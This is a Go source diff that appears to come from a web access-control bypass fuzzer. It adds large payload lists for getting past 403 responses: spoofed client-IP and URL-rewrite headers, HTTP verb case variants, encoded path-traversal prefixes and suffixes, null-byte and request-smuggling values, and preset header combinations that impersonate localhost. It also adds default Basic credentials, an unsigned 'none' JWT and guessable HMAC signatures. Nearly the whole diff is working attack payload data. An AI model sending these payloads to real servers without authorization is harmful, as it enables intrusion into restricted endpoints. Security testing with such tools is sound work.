@@ -23,45 +23,59 @@ var UserAgents = []string{
 	"AWS Security Scanner",
 }
 
-var BypassHeaders = []string{
-	"X-Original-URL",
-	"X-Rewrite-URL",
+// 1. IP Headers (Expects IP addresses)
+var IPHeaders = []string{
 	"X-Forwarded-For",
-	"X-Forwarded-Host",
-	"X-Host",
 	"X-Client-IP",
-	"X-Originating-IP",
 	"X-Real-IP",
+	"X-Originating-IP",
 	"X-Remote-IP",
 	"X-Remote-Addr",
-	"X-HTTP-Host-Override",
-	"Forwarded",
-	"X-Custom-IP-Authorization",
 	"Client-IP",
-	"Wrapped-in",
-	"X-Forwarded-Scheme",
-	"X-Forwarded-Proto",
-	"X-Frame-Options",
-	"X-Forwarded-By",
-	"X-Wap-Profile",
-	"X-True-Client-IP",
 	"True-Client-IP",
 	"Cluster-Client-IP",
 	"X-ProxyUser-Ip",
-	"X-Forwarded-Server",
+	"Real-Ip",
+	"X-Forwarded-By",
+	"X-Custom-IP-Authorization",
+}
+
+// 2. URL/Path Headers (Expects Path or Full URL)
+var URLHeaders = []string{
+	"X-Original-URL",
+	"X-Rewrite-URL",
+	"X-Custom-IP-Authorization", // Can accept path sometimes
 	"Base-Url",
 	"Http-Url",
-	"Proxy-Host",
 	"Proxy-Url",
-	"Real-Ip",
 	"Redirect",
 	"Request-Uri",
 	"Uri",
 	"X-Proxy-Url",
 	"X-HTTP-DestinationURL",
-	"X-Forwarded-Port",
-	"X-Forwarded-Home",
+	"X-Forwarded-Home", // Often path
 }
+
+// 3. Host Headers (Expects Hostname/IP)
+var HostHeaders = []string{
+	"X-Forwarded-Host",
+	"X-Host",
+	"X-HTTP-Host-Override",
+	"Forwarded", // RFC 7239 but often treated as host/for
+	"X-Forwarded-Server",
+	"Proxy-Host",
+}
+
+// 4. Scheme/Proto Headers (Expects http/https)
+var SchemeHeaders = []string{
+	"X-Forwarded-Scheme",
+	"X-Forwarded-Proto",
+	"X-Forwarded-Protocol", // Valid variation
+	"X-Url-Scheme",
+}
+
+// All headers combined for generic fallback/counting if needed (optional)
+var BypassHeaders = append(append(append(IPHeaders, URLHeaders...), HostHeaders...), SchemeHeaders...)
 
 var BypassIPs = []string{
 	"127.0.0.1",
@@ -84,6 +98,20 @@ var HTTPMethods = []string{
 	"HEAD",
 	"PUT",
 	"DELETE",
+	"PATCH",
+	"TRACE",
+	"CONNECT",
+}
+
+// HTTPMethodCases - Verb Case Switching for bypass (nomore403 technique)
+var HTTPMethodCases = []string{
+	"get", "Get", "gEt", "geT", "gET", "GeT", "GEt",
+	"post", "Post", "pOst", "poSt", "posT", "POst", "POSt",
+	"head", "Head", "hEad", "heAd", "heaD",
+	"put", "Put", "pUt", "puT",
+	"delete", "Delete", "dElete", "DELETE",
+	"patch", "Patch", "PATCH",
+	"options", "Options", "OPTIONS",
 }
 
 // Path Normalization Bypass Payloads
@@ -220,25 +248,48 @@ var AcceptHeaderValues = []string{
 }
 
 var TopPrefixes = []string{
+	// Basic slash variations
 	"/", "//", "///", "////", "/////", "//////",
 	"/./", "//./", "///./", "/././", "//././", "//././/",
 	"/../", "//../", "///../", "/..//", "//..//", "///..//", "/../../", "//../..//", "/../../../",
 	"/..;/", "//..;/", "/../;/", "/..../",
+
+	// Seclists jhaddix 403 bypass - Semicolon variants
+	"/.;/", "/;/", "//;//", "/;x=/",
+
+	// Dot and encoding combinations
 	"/%2e/", "//%2e/", "/%2e%2e/", "/%2e%2e%2f/", "/%252e/", "/%252e%252e/", "/%252e%252e%252f/",
 	"/%2f/", "//%2f/", "/%2f%2f/", "/%2f%2f%2f/", "/%252f/", "/%252f%252f/",
 	"/%2e/", "/%2f/", "/%252f/", "/%252e/", "/%2e%2e;/", "/%2f%2f%2f/", "/%2e%2e%2e/",
+
+	// Whitespace encoding
 	"/ /", "/  /", "/%20/", "/%20%20/", "/\t/", "/%09/",
+
+	// Semicolon encoding
 	"/.;/", "/;/", "/;;/", "/;;;/", "/%3b/", "/%3b%3b/",
+
+	// Query and fragment
 	"/?/", "/#/", "/%3f/", "/%23/", "/%3f%3d/", "//?=/",
+
+	// Special characters
 	"/~/", "/_/", "/+/", "/%7e/", "/%2b/", "/%25/", "/%%/", "/%25%25/", "/%%%/",
 	"/:/", "/%3a/", "/=/", "/%3d/", "/&/", "/%26/",
 	"/...//", "/.../", "/./././", "/.;/", "/.;;/",
 	"/  /", "/.  /", "/. /", "//   /",
+
+	// Null and control chars
 	"/%00/", "/%0d/", "/%0a/", "/%09/", "/%0c/", "/%0d%0a/", "/%0d%0a%0d%0a/",
+
+	// Mixed encoding
 	"/%2e./", "/.%2e/", "/%2f./", "/./.", "/%2f%2e/", "/%2e%2f/", "/%2f%2e%2f/",
 	"/%252f%252e/", "/%25%25/", "/%252f%252f/", "/%20%2e/",
 	"/;x=/", "/%2f%2f%25/", "/%2e%2e%25/", "/%25%2e/",
+
+	// Backslash and Windows-style
 	"/\\.\\.", "/\\?\\", "..;/", "../", "..://", "//..://",
+	"/admin\\/\\/", "/..\\..\\/",
+
+	// Complex encoded combinations
 	"/%2f%2e%2f%2e%2f/", "/%2f%2e%2e%2e%2f/", "/%25%25%25/",
 	"/%2e%2f%2e%2f%2e/", "/%252e%252f%252e/", "/%2f%2f%2e%2e/",
 	"/%2e%2e%2f%252f/", "/%3b%3b/", "/%2f%23%23/",
@@ -253,19 +304,41 @@ var TopPrefixes = []string{
 	"/%25%2f%2e%2f%25/", "/%2f%3b%3b%3b/", "/%2e%3b%3b/",
 	"/%2f%20%20%20/", "/%2e%20%20/",
 	"/%252f%252f%252f%252f%252f/", "/%2e%2e%2f%2f%2f%2f/",
+
+	// Seclists jhaddix 403 bypass - Additional patterns
+	"/*", "/*/", "/.random/..;/", "/..%3B/",
+	"/;%2f..%2f..%2f", "/..%00/", "/..%0d/", "/..%5c/",
+	"/%c0%af/", "/%c0%ae/", "/%e0%80%af/", "/%f0%80%80%af/",
+
+	// Double/Triple encoding prefixes
+	"/%25%32%66/", "/%25%32%65/", "/%25%35%63/",
+	"/%252f%252e%252e/", "/%25252f/", "/%25252e/",
+
+	// Unicode bypass
+	"/%u0061dmin/", "/%c0%afadmin/",
+	"/%e5%98%8a%e5%98%8d/",
 }
 
 var TopSuffixes = []string{
+	// Basic suffixes
 	"", "/", "//", "///", "////", "/////",
 	"/.", "/..", "/...", "/....", "/../", "/..//", "/../../",
+
+	// Seclists jhaddix 403 bypass - Query/Fragment suffixes
+	"?", "??", "???", "?/", "/?/", "#", "#/", "#/./",
+
+	// Common file extensions
 	".php", ".jsp", ".asp", ".aspx",
 	".json", ".xml", ".txt", ".yaml", ".yml",
-	".bak", ".backup", ".old",
+	".css", ".js", ".html", ".htm",
+
+	// Backup extensions (Seclists jhaddix style)
+	".bak", ".backup", ".old", ".inc",
 	".php.bak", ".asp.bak", ".aspx.bak",
 	".php.old", ".asp.old", ".aspx.old",
 	".json.bak", ".txt.bak", ".xml.bak", ".yaml.bak", ".yml.bak",
 	".bak.gz", ".backup.gz", ".sql.gz",
-	".php~", ".asp~", ".aspx~", ".bak~", ".sql~", ".json~",
+	".php~", ".asp~", ".aspx~", ".bak~", ".sql~", ".json~", "~",
 	".config", ".conf", ".ini", ".log",
 	".config.bak", ".conf.bak", ".ini.bak",
 	".htaccess", ".htpasswd", ".htaccess.bak", ".htpasswd.bak",
@@ -279,6 +352,8 @@ var TopSuffixes = []string{
 	".php.backup", ".asp.backup", ".aspx.backup", ".jsp.backup",
 	".php.gz", ".asp.gz", ".aspx.gz", ".json.gz", ".xml.gz",
 	".yaml.gz", ".yml.gz", ".config.gz", ".conf.gz", ".ini.gz",
+
+	// Seclists jhaddix - URL encoding suffixes
 	"/%20", "/%09", "/%0a", "/%0d", "/%00", "/%0c",
 	"%20", "%09", "%0a", "%0d", "%00", "%0c",
 	"/%0d%0a", ".%0d%0a", "%0d%0a",
@@ -293,12 +368,76 @@ var TopSuffixes = []string{
 	"/%2f%25", ".%2f%25",
 	"/%3d", ".%3d", "%3d",
 	"/%26", ".%26", "%26",
-	";", ";;",
-	"#", "##",
-	"?", "??",
+
+	// Seclists jhaddix - Semicolon and special char suffixes
+	";", ";;", ";/", "/;",
+	"#", "##", "#/",
+	"?", "??", "?id=1",
 	"..;/", "../", "..://", "//..://",
 	"\\.\\..", "\\?\\",
 	".html", ".htm",
+
+	// Seclists jhaddix - Additional bypass suffixes
+	"/./", "//", "/..", "/..;/",
+	"..%3B/", "..%00", ".%00",
+	"/°/", "/&", "/-",
+
+	// Null byte tricks
+	"%00", "%00.jpg", "%00.html", "%00.json",
+
+	// Parameter manipulation
+	"?rand=1", "?x=1", "&",
+}
+
+// Request Smuggling & Hop-by-Hop
+var SmugglingHeaders = []string{
+	"Transfer-Encoding",
+	"Content-Length",
+	"Connection",
+}
+
+var SmugglingValues = []string{
+	"chunked",
+	"keep-alive",
+	"close",
+	"TE, CL",
+}
+
+// Parameter Pollution & Query Fuzzing
+var ParameterPollutionPayloads = []string{
+	"?param=../admin",
+	"?x=../admin",
+	"?id=../admin",
+	"?page=../admin",
+	"?dir=../admin",
+	"?file=../admin",
+	"?path=../admin",
+	"?f=../admin",
+	"?redirect=../admin",
+	"?url=../admin",
+	"?dest=../admin",
+	"?return=../admin",
+	"???",
+	"&",
+	"#",
+	"%",
+}
+
+// Extension Fuzzing - Extended with jhaddix techniques
+var ExtensionPayloads = []string{
+	// Common extensions
+	".php", ".jsp", ".asp", ".aspx", ".html", ".json",
+	".php5", ".php7", ".phtml", ".shtml",
+	".bak", ".old", ".save", ".swp",
+	"~", ".orig", ".copy", ".tmp",
+
+	// Seclists jhaddix - File extension tricks
+	".json", "/.json", ".css", ".html", ".js",
+	".inc", ".~", "/~",
+
+	// Case variations (Windows bypass)
+	".PHP", ".JSP", ".ASP", ".ASPX", ".HTML", ".JSON",
+	".Php", ".Jsp", ".Asp", ".Aspx",
 }
 
 // Unicode bypass payloads for path traversal
@@ -360,4 +499,197 @@ func GenerateCaseVariations(path string) []string {
 	variations = append(variations, alt)
 
 	return variations
+}
+
+// HTTPVersions - HTTP Protocol Version Fuzzing (nomore403 technique)
+var HTTPVersions = []string{
+	"HTTP/1.0",
+	"HTTP/1.1",
+	"HTTP/2",
+}
+
+// Protocol/Scheme Headers for version/protocol manipulation
+var ProtocolHeaders = []string{
+	"X-HTTP-Protocol",
+	"X-Forwarded-Proto",
+	"X-Original-Proto",
+	"Front-End-Https",
+	"X-Https",
+}
+
+// User-Agent Bypass Values (bots, crawlers, internal tools)
+var UserAgentBypass = []string{
+	"Googlebot/2.1 (+http://www.google.com/bot.html)",
+	"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+	"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
+	"DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
+	"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
+	"Twitterbot/1.0",
+	"LinkedInBot/1.0 (compatible; Mozilla/5.0)",
+	"WhatsApp/2.21.4.22",
+	"TelegramBot (like TwitterBot)",
+	"Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
+	"internal-tool",
+	"admin-scanner",
+	"health-check",
+	"monitoring-service",
+	"curl/7.68.0",
+	"wget/1.21",
+}
+
+// Referer Bypass Values
+var RefererBypass = []string{
+	"https://www.google.com/",
+	"https://localhost/",
+	"https://127.0.0.1/",
+	"", // Empty referer
+}
+
+// ComboAttacks - Pre-defined header combinations for multi-condition bypasses
+// Each combo is a map of headers to send together
+type ComboAttack struct {
+	Name    string
+	Headers map[string]string
+}
+
+var ComboAttacks = []ComboAttack{
+	// Combo 1: Internal Network Simulation
+	{
+		Name: "internal-network",
+		Headers: map[string]string{
+			"X-Forwarded-For":  "127.0.0.1",
+			"X-Real-IP":        "127.0.0.1",
+			"X-Originating-IP": "127.0.0.1",
+			"X-Requested-With": "XMLHttpRequest",
+			"Origin":           "http://localhost",
+			"Referer":          "http://localhost/admin",
+		},
+	},
+	// Combo 2: Bot + Internal
+	{
+		Name: "bot-internal",
+		Headers: map[string]string{
+			"X-Forwarded-For":  "127.0.0.1",
+			"User-Agent":       "Googlebot/2.1 (+http://www.google.com/bot.html)",
+			"Accept":           "application/json",
+			"X-Requested-With": "XMLHttpRequest",
+		},
+	},
+	// Combo 3: API Client Simulation
+	{
+		Name: "api-client",
+		Headers: map[string]string{
+			"X-Forwarded-For":  "10.0.0.1",
+			"Content-Type":     "application/json",
+			"Accept":           "application/json",
+			"X-Requested-With": "XMLHttpRequest",
+			"Origin":           "http://localhost:3000",
+		},
+	},
+	// Combo 4: Admin Panel Access
+	{
+		Name: "admin-panel",
+		Headers: map[string]string{
+			"X-Forwarded-For":  "127.0.0.1",
+			"X-Original-URL":   "/admin",
+			"Referer":          "http://localhost/admin/login",
+			"Origin":           "http://localhost",
+			"X-Requested-With": "XMLHttpRequest",
+		},
+	},
+	// Combo 5: Full Bypass Combo
+	{
+		Name: "full-bypass",
+		Headers: map[string]string{
+			"X-Forwarded-For":        "127.0.0.1",
+			"X-Real-IP":              "127.0.0.1",
+			"X-Originating-IP":       "127.0.0.1",
+			"X-Remote-IP":            "127.0.0.1",
+			"X-Remote-Addr":          "127.0.0.1",
+			"X-Client-IP":            "127.0.0.1",
+			"Client-IP":              "127.0.0.1",
+			"True-Client-IP":         "127.0.0.1",
+			"X-Forwarded-Host":       "localhost",
+			"X-Original-URL":         "/",
+			"X-Rewrite-URL":          "/",
+			"User-Agent":             "Googlebot/2.1",
+			"Referer":                "http://localhost/admin",
+			"Origin":                 "http://localhost",
+			"X-Requested-With":       "XMLHttpRequest",
+			"Content-Type":           "application/json",
+			"Accept":                 "application/json",
+			"X-HTTP-Method-Override": "GET",
+		},
+	},
+	// Combo 6: Cloud/CDN Bypass
+	{
+		Name: "cloud-cdn",
+		Headers: map[string]string{
+			"X-Forwarded-For":   "127.0.0.1",
+			"CF-Connecting-IP":  "127.0.0.1",
+			"True-Client-IP":    "127.0.0.1",
+			"X-Forwarded-Proto": "https",
+			"X-Forwarded-Host":  "localhost",
+		},
+	},
+	// Combo 7: POST with Method Override
+	{
+		Name: "method-override-post",
+		Headers: map[string]string{
+			"X-HTTP-Method-Override": "GET",
+			"X-Method-Override":      "GET",
+			"X-HTTP-Method":          "GET",
+			"X-Forwarded-For":        "127.0.0.1",
+			"Content-Type":           "application/x-www-form-urlencoded",
+		},
+	},
+}
+
+// Common Auth Tokens for token-based bypass attempts
+var CommonAuthTokens = []string{
+	"admin",
+	"internal",
+	"bypass",
+	"test",
+	"debug",
+	"dev",
+	"development",
+	"staging",
+	"root",
+	"system",
+	"api",
+	"secret",
+	"token",
+	"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", // JWT header
+	"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0",  // JWT none algorithm
+	"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0", // Simple admin JWT
+	"Bearer admin",
+	"Bearer internal",
+	"Basic YWRtaW46YWRtaW4=",     // admin:admin
+	"Basic YWRtaW46cGFzc3dvcmQ=", // admin:password
+	"Basic cm9vdDpyb290",         // root:root
+	"Basic dGVzdDp0ZXN0",         // test:test
+}
+
+// Common Signatures for HMAC/signature bypass
+var CommonSignatures = []string{
+	"admin",
+	"bypass",
+	"test",
+	"secret",
+	"internal",
+	"0000000000000000",
+	"ffffffffffffffff",
+	"00000000",
+	"ffffffff",
+	"d033e22ae348aeb5660fc2140aec35850c4da997",                         // SHA1 of "admin"
+	"8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918", // SHA256 of "admin"
+}
+
+// X-Requested-With values
+var XRequestedWithValues = []string{
+	"XMLHttpRequest",
+	"com.android.browser",
+	"fetch",
+	"axios",
 }
